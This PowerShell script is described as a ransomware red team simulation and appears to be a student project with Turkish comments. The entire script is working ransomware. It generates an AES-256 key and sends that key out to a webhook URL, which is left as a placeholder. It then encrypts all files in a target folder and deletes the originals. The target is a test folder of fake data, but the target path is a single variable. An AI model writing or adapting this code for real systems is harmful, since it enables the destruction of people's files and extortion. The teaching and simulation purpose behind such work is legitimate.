# L15 Ransomware - Red Team Simulation
$hedefDizin = "$HOME\Desktop\vize-proje\Simulasyon-L15\hassas_veriler"
$webhookUrl = "BURAYA_WEBHOOK_LINKINI_YAPISTIR" 

# Test verisi oluştur
if (!(Test-Path $hedefDizin)) { New-Item -ItemType Directory -Path $hedefDizin }
"Sanal Finans Verisi: 50.000 TL" | Out-File "$hedefDizin\finans.txt"

# AES Anahtarı Üret (256-bit)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.GenerateKey()
$key = [Convert]::ToBase64String($aes.Key)

# Anahtarı Webhook'a Sızdır (Exfiltration)
$body = @{ student = "Eray Turan"; status = "Compromised"; key = $key } | ConvertTo-Json
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
} catch {
    Write-Host "[-] Baglanti Hatasi: Anahtar sizdirilamadi!" -ForegroundColor Red
}

# Dosyaları Şifrele
Get-ChildItem $hedefDizin -File | ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    $enc = $aes.CreateEncryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes(($_.FullName + ".enc"), $enc)
    Remove-Item $_.FullName
}
Write-Host "[!] SALDIRI TAMAMLANDI: Dosyalar sifrelendi ve anahtar sızdırıldı." -ForegroundColor Red
